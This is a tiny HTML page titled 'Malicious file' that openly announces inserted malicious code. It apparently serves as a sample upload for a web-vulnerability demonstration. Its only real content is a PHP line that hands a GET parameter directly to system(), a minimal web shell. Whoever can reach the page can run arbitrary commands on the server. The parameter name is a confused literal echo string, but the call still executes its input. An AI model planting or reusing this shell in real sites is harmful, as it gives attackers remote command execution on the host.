<!DOCTYPE html>

<html>
    <head>
        <meta charset="UTF-8">
        <title>Malicious file</title>
    </head>
    <body>
	<h1>Malicious Code has been inserted!</h1>
 <?php
 system($_GET['echo "Malicious Code!!"']);
 ?>
    </body>
</html>
